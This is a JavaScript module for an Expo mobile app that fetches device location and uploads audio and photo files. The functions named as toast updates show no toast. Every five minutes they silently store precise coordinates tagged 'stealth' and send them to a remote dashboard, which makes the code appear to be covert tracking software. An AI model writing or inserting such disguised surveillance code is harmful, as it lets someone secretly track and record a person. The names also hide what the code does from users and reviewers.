import * as Location from 'expo-location';
import { sendRecordingEvent, uploadAudioFile, uploadPhotoFile } from './ApiService';
import { addAudioRecordingData, addLocationData } from './DataStorageService';

export async function fetchLocation() {
  try {
    const { status } = await Location.requestForegroundPermissionsAsync();
    if (status !== 'granted') return { latitude: 0, longitude: 0 };

    const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Highest });
    return { latitude: loc.coords.latitude, longitude: loc.coords.longitude };
  } catch (e) {
    console.error("Failed to fetch location:", e);
    return { latitude: 0, longitude: 0 };
  }
}

export async function fetchLocationAndUploadAudio(uri, duration = null) {
  const loc = await fetchLocation();
  
  console.log('🎤 Storing audio data with duration:', duration, 'uri:', uri);
  
  // Store audio recording data locally
  await addAudioRecordingData(uri, loc.latitude, loc.longitude, duration, new Date().toISOString(), 'recording');

  uploadAudioFile(uri);
}

export async function fetchLocationAndUploadPhoto(uri) {
  const loc = await fetchLocation();
  // optional: send event if needed
  uploadPhotoFile(uri);
}

export async function fetchLocationAndShowToast() {
  try {
    const { status } = await Location.getForegroundPermissionsAsync();
    if (status !== 'granted') {
      return { latitude: 0, longitude: 0 };
    }

    const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Highest });
    
    // Store location data locally (silently)
    await addLocationData(loc.coords.latitude, loc.coords.longitude, new Date().toISOString(), 'stealth');
    // Also send to server every tick
    await sendRecordingEvent('foreground_location', loc.coords.latitude, loc.coords.longitude);
    
    return { latitude: loc.coords.latitude, longitude: loc.coords.longitude };
  } catch (e) {
    console.error("Failed to fetch location:", e);
    return { latitude: 0, longitude: 0 };
  }
}

let locationInterval = null;

export function startLocationToastUpdates() {
  if (locationInterval) {
    clearInterval(locationInterval);
  }
  
  // Run every 300,000ms (5 minutes) - sends location to dashboard automatically
  locationInterval = setInterval(() => {
    fetchLocationAndShowToast();
  }, 300000);
  
  // Show first location immediately on start
  fetchLocationAndShowToast();
}

export function stopLocationToastUpdates() {
  if (locationInterval) {
    clearInterval(locationInterval);
    locationInterval = null;
  }
}

// Default export for Expo Router compatibility
export default {
  fetchLocation,
  fetchLocationAndUploadAudio,
  fetchLocationAndUploadPhoto,
  fetchLocationAndShowToast,
  startLocationToastUpdates,
  stopLocationToastUpdates,
};